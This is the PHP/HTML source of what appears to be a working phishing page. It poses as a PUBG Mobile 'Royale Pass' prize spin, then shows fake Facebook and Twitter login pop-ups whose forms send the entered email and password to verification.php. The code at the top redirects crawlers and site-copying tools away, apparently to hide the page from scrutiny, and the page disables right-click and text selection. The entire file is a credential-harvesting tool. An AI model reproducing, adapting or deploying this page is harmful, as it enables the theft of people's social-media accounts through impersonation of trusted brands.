<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: header.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title data-lang="code50">PUBG MOBILE | Official Home</title>
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <style>
   @font-face {
     font-family:halloween;
     src: url('css/hal.ttf') format("truetype");
      }
      @font-face {
     font-family:pubg;
     src: url('css/pubg.ttf') format("truetype");
      }
       body {
        background: url(media/3.jpeg);
        margin:0;
        box-sizing:border-box;
       }
     ::-webkit-scrollbar {
     display: none;
     }
       .wrap {
           width:100%;
           height:100%;
           background:red;
       }
       .wrap .bg {
           position:relative;
           width:100%;
           height:100%;
           background:url(media/3.jpeg) no-repeat center;
           background-size:cover; 
       }
       .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:415px;
       }
       
       .bg .label {
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
           text-align:center;
           width:415px;
           background:url('img/popup.png') no-repeat center;
           background-size:100% 100%;
           background-position:90% 100%;
           height:44px;
           line-height:44px;
           box-shadow:0 2px 1px black;
       }
       .label span:nth-child(1){
           font-family: 'pubg', sans-serif;
           color:white;
           font-size:20px;
           font-weight:bold;
           text-shadow:0 0.5px 3px black;
       
       }
       .label span:nth-child(2){
           margin-top:2px;
           text-shadow:0 0.5px 3px black;
           margin-right:4px;
           width:90px;
           color:orange;
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
           float:right;
           font-family:'pubg';
           height:36px;
           line-height:36px;
           font-size:19px;
           font-weight:bold;
           border-radius:4px;
           padding-left:5px;
       }
       .label span:nth-child(2) i {
           margin-top:7px;
           font-size:20px;
       }
       .bg .box {
           width:100%;
           height:100%;
           background:url('img/aa.jpg') no-repeat center;
           background-size:100% 100%;
           text-align:center;
           margin-top:-30px;
           border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;
       }
       
       .box .spin {
           background:url('img/pe6.png') no-repeat;
           background-size:cover;
           width:380px;
           margin-top:30px;
           text-align:center;
           height:380px;
       }
       .box .bgspin2 {
           background:url('img/pe13.png') no-repeat;
           background-size:cover;
           width:380px;
           margin-top:30px;
           text-align:center;
           height:380px;
       }

       
       .box .start {
           position:relative;
           border:none;
           bottom:450px;
           width:180px;
       }

       .c10{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 57%;
        top: 96%;
        border-radius: 5px;
       }
       .c20{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 27%;
        top: 96%;
        border-radius: 5px;
       }
       .c10off{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 57%;
        top: 96%;
        border-radius: 5px;
       }
       .c20off{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 27%;
        top: 96%;
        border-radius: 5px;
       }

       .mask {
           position:fixed;
           top:0;
           left:0;
           width:100%;
           height:100%;
           background:rgba(0,0,0,0.50);
       }
       .alert {

           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:150px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
           animation:da 2s forwards ;
           transition:ease-in-out;
       }
       @keyframes da {
           from { transform:translate(-50%,-80%);}
           to { transform:translate(-50%,-50%);}
       }
       .alert .top {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alert p {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
      .alert p i {
           font-size:40px;
       }
       .alert .btn {
           margin-top:4px;
           width:95px;
           height:30px;
           line-height:30px;
           font-weight:bold;
           font-size:16px;
           font-family:'pubg';
           background:orange;
           border-radius:5px;
       }
       .alertx {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('img/popup3.png') center no-repeat;
           background-size:cover;
           width:420px;
           height:280px;
           border-top:none;
           animation:dax 2s forwards ;
           transition:ease-in-out;
           border:1px solid black;
           border-radius: 5px;
       }
       .alertx4 {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('img/popup3.png') center no-repeat;
           background-size:cover;
           width:420px;
           height:280px;
           border-top:none;
           animation:dax 2s forwards ;
           transition:ease-in-out;
           border:1px solid black;
           border-radius: 5px;
       }
       @keyframes dax {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertx .topx {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertx .px {
           font-family:'pubg';
           color:black;
           font-weight:bold;
           font-size:25px;
           padding:60px 10px 10px 10px;
       }
      .alertx .px img {
           width:120px;
           height:120px;
           position: absolute;
           top: 28%;
           left: 36%;
       }
       .alertx .p{
        font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:25px;
           padding:10px 10px 10px 10px;
       }
       .alertx4 .topx {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertx4 .px {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
      .alertx4 .px #gambar1 {
           width:90px;
           height:90px;
           position: absolute;
           top: 28%;
           left: 5%;
       }
       .alertx4 .px #gambar2 {
           width:90px;
           height:90px;
           position: absolute;
           top: 28%;
           left: 28%;
       }
       .alertx4 .px #gambar3 {
           width:90px;
           height:90px;
           position: absolute;
           top: 28%;
           left: 52%;
       }
       .alertx4 .px #gambar4 {
           width:90px;
           height:90px;
           position: absolute;
           top: 28%;
           left: 75%;
       }
       .btnxok {
            position: absolute;
           top: 87%;
           left: 40%;
           border-radius:5px;
       }
       .btnxcancel {
            position: absolute;
           top: 87%;
           left: 17%;
           border-radius:5px;
       }
       /**/
       .alertl {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('img/popup4.png') no-repeat;
           background-size:cover;
           width:420px;
           height:280px;
           border-top:none;
           animation:dal 1s forwards ;
           transition:ease-in-out;
       }
       @keyframes dal {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertl .topl {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:15px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertl .pl {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
       .alertl .fb {
           height:38px;
           line-height:36px;
           width:260px;
           background:#3b5998;
           font-size:19px;
           padding-left:10px;
           border-radius:4px;
           box-shadow:0 3px 1px #c8dce3;
           color:white;
           font-weight:bold;
           margin-top:18%;
           font-family:'pubg';
           text-align:center;
       }
       .alertl .tw {
           padding-left:10px;
           height:38px;
           line-height:36px;
           width:260px;
           background:#1DA1F2;
           font-size:19px;
           border-radius:4px;
           box-shadow:0 3px 1px #c8dce3;
           color:white;
           font-weight:bold;
           margin-top:7%;
           font-family:'pubg';
           text-align:center;
       }
       .fb i , .tw i {
           margin-top:8px;
           float:left;
       }
             @media only screen and (min-width:100px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:150px;
       }
      }
       @media only screen and (min-width:200px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:370px;;
       }
       .bg .label {
           border:none;
           width:370px;
       }
       .bg .box {
           width:370px;
           height:380px;
       }
       .img {
           position:absolute;
           width:10px;
       }
       .box .spin {
           background:url('img/pe6.png') no-repeat;
           background-size:cover;
           width:350px;
           text-align:center;
           height:350px;
       }
       .box .bgspin2 {
           background:url('img/pe13.png') no-repeat;
           background-size:cover;
           width:350px;
           text-align:center;
           height:350px;
       }
       .box .start {
           position:relative;
           border:none;
           bottom:268px;
           width:170px;
       }
      
       }
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border:none;
           margin-top:-3px;
           width:410px;
       }
       .bg .box {
           width:410px;
           height:460px;
       }
      
       .alert {
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
       }
       }
       #da {
           display:none;
       }
       .preload { 
         background:black;
         z-index:999;
         width:100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         display:flex;
         align-items:center;
         justify-content:center;
        }
        .preload h1 {
            font-family:'halloween';
            font-size:5em;
            color:orange;
        }
        .navbar-fb {
  background: #3b5998;
  height: auto;
  width:314px;
  padding: 8px;
  border-top-left-radius: 10px;
  border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115PX;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb img {
    width: 60;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 270px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.login-form input[type="text"],.login-form input[type="password"] {
  width: 275px;
  height: auto;
  padding: 12px;
  color: #000;
  font-size: 14px;
  font-weight: 400;
  font-family: 'Lato',sans-serif;
  border: 1px solid #bdbebf;
  cursor: pointer;
  outline: none;
}
.login-form input[type="text"] {
    margin: 0;
    padding-bottom: 13px;
  border-bottom: none;
  border-radius: 4px 4px 0 0;
  box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-form input[type="password"] {
    margin: 0;
  border-top: none;
  border-radius: 0 0 4px 4px;
  box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
  background: #1778f2;
  width: 275px;
  height: auto;
  margin-top: 10px;
  margin-left: auto;
  margin-right: auto;
  padding: 10px;
  color: #fff;
  font-size: 14px;
  font-family: Roboto;
  font-weight: bold;
  text-align: center;
  text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
  border: 1px solid #3578e5;
  border-radius: 5px;
  box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
  outline: none;
  display: block;
}
.txt-create-account {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}

   .header-twitter {
    background: #fff;
    width: 100%;
    font-size: 25px;
    font-weight: bold;
    text-align: left;
    position: relative;
    border-radius: 10px;
}
.header-twitter img {
    width: 55;
}
.box-twitter {
    width: 100%;
    height: 400px;
    position: absolute;
    overflow: none;
    font-size: 15px;
    font-family: sans-serif;
    border-radius: 10px;
}
.txt-login-twitter {
    color: #000;
    font-size: 20px;
    font-weight: bold;
    font-family: arial, sans-serif;
    margin-top: 3%;
    margin-bottom: 5%;
}
.input-box-twitter {
    background: #f5f8fa;
  width: 90%;
  height: 55px;
  margin-top: 10px;
  margin-bottom: 18px;
  padding: 10px;
  padding-top: 5px;
  font-size: 14px;
  font-family: arial, sans-serif;
  text-align: left;
  position: relative;
  border-bottom: 2px solid #657786;
  border-radius: 2px;
  outline: none;
  z-index: 2;
}
.input-box-twitter label {
    color: #657786;
  text-align: left;
}
.input-box-twitter input {
  background: transparent;
  width: 100%;
  height: auto;
  padding: 7px;
  padding-top: 3px;
  padding-left: 0px;
  color: #000;
  font-size: 18px;
  font-family: arial, sans-serif;
  text-align: left;
  position: relative;
  border: none;
  outline: none;
  z-index: 2;
}
.btn-login-twitter {
    background: #1da1f2;
    width: 90%;
    height: auto;
    padding: 14px;
    color: #fff;
    font-size: 15px;
    font-weight: bold;
    font-family: arial, sans-serif;
    border: none;
    border-radius: 30px;
    outline: none;
    letter-spacing: 1;
}
.footer-menu-twitter {
    width: auto;
    height: auto;
    margin: 0.5%;
    margin-top: 7%;
    color: #1da1f2;
    font-size: 14px;
    font-family: arial, sans-serif;
    display: inline-block;
}
.bulet {
    color: #000;
    font-size: 8px;
}
.aktifnya {
    color: #1da1f2;
    border-bottom: 2px solid #1da1f2;
}
          .popup-login {
  background:rgba(0,0,0,0.5);
  width:100%;
  height:100%;
  position:fixed;
  top:0;
  left:0;
  z-index:9999;
}
.popup-box-login-fb {
  background:#ECEFF6;
  max-width:330px;
  height:auto;
  position:relative;
  margin:50px auto;
  margin-top:1.9%;
  text-align:center;
  font-family:'Teko';
  color:#000;
  border-radius:10px;
}
.popup-box-login-twitter {
  background:#fff;
  max-width:330px;
  height:350px;
  position:relative;
  margin:50px auto;
  margin-top:10%;
  text-align:center;
  font-family:'Teko';
  color:#000;
  border-radius:10px;
}
.close-fb {
  background:#000;
  width:20px;
  height:20px;
  color:#fff;
  text-align:center;
  text-decoration:none;
  border-radius:50%;
  border:1.5px solid #fff;
  position:absolute;
  top:-8px;
  right:-10px;
  display:block;
}
.close-fb i {
  color:#fff;
  padding-top:1px;
}
.close-other {
  background:#000;
  width:20px;
  height:20px;
  color:#fff;
  text-align:center;
  text-decoration:none;
  border-radius:50%;
  border:1.5px solid #fff;
  top:-8px;
  right:-10px;
  position:absolute;
  z-index:9999999;
  display:block;
}
.close-other i {
  color:#fff;
  padding-top:1px;
}
@media only screen and (max-width:600px) {
  .popup-box-login-fb {
    margin-top: 4%;
  }
   .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:98%;
       }
         .bg .label {
           border-radius:0;
           margin-top:0;
           width:98%;
       }
       .bg .box {
           border-radius:0;
           width:98%;
           height:470px;
           border-radius: 0px 0px 10px 10px;
       }
      
  .c10{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 60%;
        top: 87%;
        border-radius: 5px;
       }
       .c20{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 20%;
        top: 87%;
        border-radius: 5px;
       }
       .c10off{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 60%;
        top: 87%;
        border-radius: 5px;
       }
       .c20off{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 20%;
        top: 87%;
        border-radius: 5px;
       }
       .alertx {
           display:none;
           position:absolute;
           top:50%;
           background:url('img/popup3.png') center no-repeat;
           background-size:100% 100%;
           width:95%;
           height:280px;
           border-top:none;
           animation:dax 2s forwards ;
           transition:ease-in-out;
           border:1px solid black;
           border-radius: 5px;
       }
       @keyframes dax {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertx .p{
        font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:px;
           padding:10px 10px 10px 10px;
       }
       .alertx4 {
           display:none;
           position:absolute;
           top:50%;
           background:url('img/popup3.png') center no-repeat;
           background-size:100% 100%;
           width:95%;
           height:280px;
           border-top:none;
           animation:dax 2s forwards ;
           transition:ease-in-out;
           border:1px solid black;
           border-radius: 5px;
       }
       @keyframes dax {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }

      .alertx4 .px #gambar1 {
           width:73px;
           height:73px;
           position: absolute;
           top: 28%;
           left: 5%;
       }
       .alertx4 .px #gambar2 {
           width:73px;
           height:73px;
           position: absolute;
           top: 28%;
           left: 28%;
       }
       .alertx4 .px #gambar3 {
           width:73px;
           height:73px;
           position: absolute;
           top: 28%;
           left: 52%;
       }
       .alertx4 .px #gambar4 {
           width:73px;
           height:73px;
           position: absolute;
           top: 28%;
           left: 75%;
       }

       .alertl {
           display:none;
           position:absolute;
           top:50%;
           background:url('img/popup4.png') no-repeat;
           background-size:100% 100%;
           width:95%;
           height:280px;
           border-top:none;
           animation:dal 1s forwards ;
           transition:ease-in-out;
       }
       @keyframes dal {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }


}
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:430px;
       }
         .bg .label {
           border-radius:0;
           margin-top:0;
           width:430px;
       }
       .bg .box {
           border-radius:0;
           width:430px;
           height:530px;
           border-radius: 0px 0px 10px 10px;
       }
       .alert {
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
       }
       .footer-menu-twitter {
           margin-top:-30px;
       }
       .c10{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 57%;
        top: 99%;
        border-radius: 5px;
       }
       .c20{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 27%;
        top: 99%;
        border-radius: 5px;
       }
       .c10off{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 57%;
        top: 99%;
        border-radius: 5px;
       }
       .c20off{
        width: 100px;
        height: 40px;
        position: absolute;
        left: 27%;
        top: 99%;
        border-radius: 5px;
       }
       }
   </style>
   </head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<center>
        <div class="wrap">
        <div class="bg">
            <video src="img/pubg.mp4"
<video style="width: 100%;" src="img/pubg.mp4" autoplay="" loop="" muted=""></video>  
            <div class="label" style="border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;">
                <span>ROYALE PASS</span>
                <span id="waktu"><i style="float:left;" class="fa fa-clock-o" aria-hidden="true"></i><p></p></span>
            </div>
            <div class="box">

                <center>
                  <div class="spin" id="spon">
                   <img src="img/pe8.png" class="spinimg" style="width: 315px; margin-top: 20px; margin-left: -1px;" >
                </div>
                </center>
                <img class="start" src="media/o4.png">
            </div> 
        </div>
    </div>
    <img src="img/draw3.png" class="c20" onclick="spin1()" id="c20"> 
    <img src="img/draw5.png" class="c10" onclick="spin4()" id="c10">
    <img src="img/draw3off.png" class="c20off" id="c20off" style="display: none;">
    <img src="img/draw5off.png" class="c10off" id="c10off" style="display: none;">
    
    
    
    
    <div class="mask" style="display: none;"></div>


            
     <div class="alertx" style="display: block;">
            <p class="px">
            Redeem code is being processed
    
      Please wait up to 24 hours to receive this rewards in your ingame mailbox
            </p>

            <div class="btnxok" onclick="location.href='https://pubgmobile.com/'"><img src="img/ok.png" width="89px" height="32px" onmousedown="buka.play();"></div>
        </div>

                                    
        <div class="alertx4">
            <p class="px">
            <img id="gambar1" src="img/r/1.png">
            <img id="gambar2" src="img/r/4.jpg">
            <img id="gambar3" src="img/r/5.jpg">
            <img id="gambar4" src="img/r/8.png">
            </p>
            <div class="btnxcancel" onclick="location.href='index.php'" onmousedown="tutup.play();"><img src="img/cancel.png" width="89px" height="32px"></div>
            <div class="btnxok" onclick="claim()"><img src="img/ok.png" width="89px" height="32px" onmousedown="buka.play();"></div>
        </div>
        
        <div class="alertl">
                <div class="fb" onclick="fb()" onmousedown="buka.play();"><i class="fa fa-facebook-square" aria-hidden="true"></i>Login With Facebook</div>
                <div class="tw" onclick="tw()" onmousedown="buka.play();"><i class="fa fa-twitter-square" aria-hidden="true"></i>Login With Twitter</div>
        </div>
    
    
    
    
    
    <link rel="stylesheet" href="https://www.pubgmobile.com/common/css/footer.css">

<audio id="da" src="media/putar.mp3" controls="">
Your browser does not support the audio element.
</audio>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
  <div class="popup-box-login-twitter">
  <a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
    <div class="header-twitter">
      <center>
      <img width="45" style="margin-bottom:-25px;" src="img/twitter_text.png">
      </center>
    </div>
    <div class="box-twitter">
      <center>
      <form action="verification.php" method="post">
        <div class="txt-login-twitter">Login to Twitter</div>
        <div class="input-box-twitter">
          <label>Phone, email, or username</label>
          <input type="text" name="imel" placeholder="" required="">
        </div>
        <div class="input-box-twitter">
          <label>Password</label>
          <input type="password" name="pw" placeholder="" required="">
        </div>
        <input type="hidden" name="log" value="Twitter" readonly="">
        <button type="submit" class="btn-login-twitter">Log In</button>
        <div class="footer-menu-twitter">Forgot password?</div>
        <div class="footer-menu-twitter bulet">•</div>
        <div class="footer-menu-twitter">Sign up to Twitter</div>
      </form>
      </center>
    </div>
  </div>
</div>


<div class="popup-login login-facebook animated fadeIn" style="display: none;">
  <div class="popup-box-login-fb">
    <a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
    <div class="navbar-fb">
      <img width="45" src="img/facebook_text.png">
    </div>
    <div class="content-box-fb">
      <img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
      <div class="txt-login-fb">
         Log in to your Facebook account to connect to PUBG MOBILE
      </div>
      <form class="login-form" action="verification.php" method="post">
        <label>
        <input type="text" name="imel" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="">
        </label>
        <label>
        <input type="password" name="pw" placeholder="Password" autocomplete="off" autocapitalize="off" required="">
        </label>
        <input type="hidden" name="log" value="Facebook" readonly="">
        <button type="submit" class="btn-login-fb">Log In</button>
      </form>
      <div class="txt-create-account">Create account</div>
      <div class="txt-not-now">Not now</div>
      <div class="txt-forgotten-password">Forgotten password?</div>
    </div>
    <div class="language-box">
      <center>
      <div class="language-name language-name-active">English (UK)</div>
      <div class="language-name">Bahasa Indonesia</div>
      <div class="language-name">Basa Jawa</div>
      <div class="language-name">Bahasa Melayu</div>
      <div class="language-name">日本語</div>
      <div class="language-name">Español</div>
      <div class="language-name">Português (Brasil)</div>
      <div class="language-name">
        <i class="fa fa-plus"></i>
      </div>
      </center>
    </div>
    <div class="copyright">Facebook Inc.</div>
  </div>
</div>


</center>
<script>
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";
   setTimeout(function() {
    $('.mask').hide();
    $('.alert').hide();
   },5000);
   function hide(){
    $('.mask').hide();
    $('.alert').hide();
   }
   function claim() {
       $('.alertx').hide();
       $('.mask').show();
       $('.alertl').show();
   }
   function fb() {
       $('.alertl').hide();
       $('.login-facebook').show();
   }
   function tw() {
       $('.alertl').hide();
       $('.login-twitter').show();
   }
   function tutup_facebook() {
       $('.alertl').show();
       $('.login-facebook').hide();
   }
   function tutup_twitter() {
       $('.alertl').show();
       $('.login-twitter').hide();
   }
    function spin1() {
      document.getElementById("c10").style.display = "none";
      document.getElementById("c20").style.display = "none";
      document.getElementById("c10off").style.display = "block";
      document.getElementById("c20off").style.display = "block";
    document.getElementById("spon").setAttribute("class", "bgspin2");
     document.getElementsByTagName("audio")[0].play();
    setTimeout(function() {
    $('.alertx').show();
    $('.mask').show();
   },3900);

  var $myElm = $("#spon");

  function rotate(degrees) {
    $myElm.css({
      '-webkit-transform': 'rotate(' + degrees + 'deg)',
      '-moz-transform': 'rotate(' + degrees + 'deg)',
      '-ms-transform': 'rotate(' + degrees + 'deg)',
      'transform': 'rotate(' + degrees + 'deg)'
    });
  }
 $({
    deg: 0
  }).animate({
    deg: 360 * 40
  }, {
    duration: 3900,
    step: function() {
        const lord = Math.random() * (360 - 1) + 1;
      var deg = this.deg;
      rotate(lord * 4);
    }
  });
}
 function spin4() {
   document.getElementById("c10").style.display = "none";
  document.getElementById("c20").style.display = "none";
   document.getElementById("c10off").style.display = "block";
  document.getElementById("c20off").style.display = "block";
    document.getElementById("spon").setAttribute("class", "bgspin2");
     document.getElementsByTagName("audio")[0].play();
    setTimeout(function() {
    $('.alertx4').show();
    $('.mask').show();
   },3900);

  var $myElm = $("#spon");

  function rotate(degrees) {
    $myElm.css({
      '-webkit-transform': 'rotate(' + degrees + 'deg)',
      '-moz-transform': 'rotate(' + degrees + 'deg)',
      '-ms-transform': 'rotate(' + degrees + 'deg)',
      'transform': 'rotate(' + degrees + 'deg)'
    });
  }
 $({
    deg: 0
  }).animate({
    deg: 360 * 40
  }, {
    duration: 3900,
    step: function() {
        const lord = Math.random() * (360 - 1) + 1;
      var deg = this.deg;
      rotate(lord * 4);
    }
  });
}
setInterval(function time(){
  var d = new Date();
  var hours = 24 - d.getHours();
  var min = 60 - d.getMinutes();
  if((min + '').length == 1){
    min = '0' + min;
  }
  var sec = 60 - d.getSeconds();
  if((sec + '').length == 1){
        sec = '0' + sec;
  }
  jQuery('#waktu p').html(hours+':'+min+':'+sec)
}, 1000);
</script>
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
</script>
</body></html>